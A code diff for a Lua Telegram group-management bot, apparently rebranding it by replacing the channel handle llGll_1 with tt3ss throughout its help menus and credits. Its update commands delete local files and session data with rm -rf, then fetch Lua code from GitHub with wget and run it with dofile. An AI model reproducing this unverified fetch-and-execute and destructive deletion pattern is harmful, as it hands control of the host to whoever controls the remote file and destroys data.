@@ -9183,7 +9228,7 @@ local TkeedList = DevAli:scard(IrAq.."Ali:Ali:Tkeed:"..ChatId) or 0
 local AdminsList = DevAli:scard(IrAq.."Ali:Admins:"..ChatId) or 0
 local VipList = DevAli:scard(IrAq.."Ali:VipMem:"..ChatId) or 0
 local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
-if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/llGll_1' end
+if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/tt3ss' end
 tdcli_function({ID ="GetChat",chat_id_=ChatId},function(arg,dp)
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = ChatId:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
 if dp.id_ then
@@ -9193,7 +9238,7 @@ if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
 Manager_id = admins[i].user_id_
 tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,Ali) 
 if Ali.first_name_ ~= false then
-ConstructorAli = "["..Ali.first_name_.."](T.me/"..(Ali.username_ or "llGll_1")..")"
+ConstructorAli = "["..Ali.first_name_.."](T.me/"..(Ali.username_ or "tt3ss")..")"
 else 
 ConstructorAli = "حساب محذوف"
 end
@@ -10023,7 +10068,7 @@ local Text = [[
 ♪︙م5 ↫ اوامر المطورين
 ♪︙م6 ↫ اوامر الاعضاء
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/llGll_1)
+♪︙[Source Channel](https://t.me/tt3ss)
 ]] 
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..msg.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..msg.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..msg.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..msg.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..msg.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
@@ -10095,7 +10140,7 @@ local Text = [[
 ♪︙البوتات بالطرد
 ♪︙البوتات بالتقيد
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/llGll_1)
+♪︙[Source Channel](https://t.me/tt3ss)
 ]]
 Dev_Ali(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -10171,7 +10216,7 @@ local Text = [[
 ♪︙تقييد يوم + عدد الايام
 ♪︙الغاء تقييد ↫ لالغاء التقييد بالوقت
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/llGll_1)
+♪︙[Source Channel](https://t.me/tt3ss)
 ]]
 Dev_Ali(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -10236,7 +10281,7 @@ local Text = [[
 ♪︙ردود المدير • ردود المطور • التحقق
 ♪︙ضافني • حساب العمر • الزخرفه
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/llGll_1)
+♪︙[Source Channel](https://t.me/tt3ss)
 ]]
 Dev_Ali(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -10295,7 +10340,7 @@ local Text = [[
 ♪︙المنشئين الاساسيين 
 ♪︙حذف جميع الرتب
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/llGll_1)
+♪︙[Source Channel](https://t.me/tt3ss)
 ]]
 Dev_Ali(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -10381,7 +10426,7 @@ local Text = [[
 ♪︙ترحيب البوت • المغادره
 ♪︙البوت الخدمي • التواصل
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/llGll_1)
+♪︙[Source Channel](https://t.me/tt3ss)
 ]]
 Dev_Ali(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -10429,28 +10474,12 @@ local Text = [[
 ♪︙تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
 ♪︙انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/llGll_1)
+♪︙[Source Channel](https://t.me/tt3ss)
 ]]
 Dev_Ali(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end
 --     Source IrAq     --
 if SecondSudo(msg) then
-if text == 'تحديث المتجر' then 
-io.popen("mkdir Files")
-os.execute("rm -fr Files/*")
-io.popen("cd Files && wget https://raw.githubusercontent.com/IrAqTEM/IrAqFiles/main/IrAqFiles/AddedMe.lua") 
-io.popen("cd Files && wget https://raw.githubusercontent.com/IrAqTEM/IrAqFiles/main/IrAqFiles/AutoFile.lua")  
-io.popen("cd Files && wget https://raw.githubusercontent.com/IrAqTEM/IrAqFiles/main/IrAqFiles/ChangeName.lua") 
-io.popen("cd Files && wget https://raw.githubusercontent.com/IrAqTEM/IrAqFiles/main/IrAqFiles/ChangePhoto.lua") 
-io.popen("cd Files && wget https://raw.githubusercontent.com/IrAqTEM/IrAqFiles/main/IrAqFiles/ChangeUser.lua") 
-io.popen("cd Files && wget https://raw.githubusercontent.com/IrAqTEM/IrAqFiles/main/IrAqFiles/MuteNames.lua") 
-io.popen("cd Files && wget https://raw.githubusercontent.com/IrAqTEM/IrAqFiles/main/IrAqFiles/ProNames.lua") 
-io.popen("cd Files && wget https://raw.githubusercontent.com/IrAqTEM/IrAqFiles/main/IrAqFiles/ReplyBot.lua") 
-io.popen("cd Files && wget https://github.com/IrAqTEM/IrAqFiles/blob/main/IrAqFiles/TagAdmins.lua") 
-io.popen("cd Files && wget https://raw.githubusercontent.com/IrAqTEM/IrAqFiles/main/IrAqFiles/TagAll.lua") 
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙تم تحديث المتجر الى الاصدار الجديد', 1, 'md') 
-dofile('IrAq.lua') 
-end
 if text == "تحديث السورس" or text == "تحديث سورس" then 
 Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙جاري تحديث سورس عراق', 1, 'md') 
 os.execute('rm -rf IrAq.lua') 
@@ -10458,7 +10487,7 @@ os.execute('wget https://raw.githubusercontent.com/IrAqTEM/IrAq/master/IrAq.lua'
 dofile('IrAq.lua') 
 io.popen("rm -rf ../.telegram-cli/*")
 print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙تم التحديث الى الاصدار 2.0', 1, 'md') 
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙تم التحديث الى الاصدار الجديد', 1, 'md') 
 end
 if text == 'تحديث' or text == 'تحديث البوت' or text == '↫ تحديث ♪' then  
 dofile('IrAq.lua') 
@@ -10652,7 +10681,7 @@ Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙لم يتم تعيين قناة الا�
 end end end end
 --     Source IrAq     --
 if text == 'القناة' or text == 'قناة السورس' or text == 'قناه السورس' or text == 'قنات السورس' then 
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙Channel ↬ [@llGll_1]', 1, 'md')    
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙Channel ↬ [@tt3ss]', 1, 'md')    
 end 
 --     Source IrAq     --
 if Sudo(msg) then 
@@ -10786,7 +10815,7 @@ end
 end 
 ------------------------------------------------
 -- This Source Was Developed By (Ali) @AAAPA.--
---   This Is The Source Channel @llGll_1 .   --
+--   This Is The Source Channel @tt3ss .   --
 --                - IrAq -                 --
---        -- https://t.me/llGll_1 --         --
+--        -- https://t.me/tt3ss --         --
 ------------------------------------------------ 
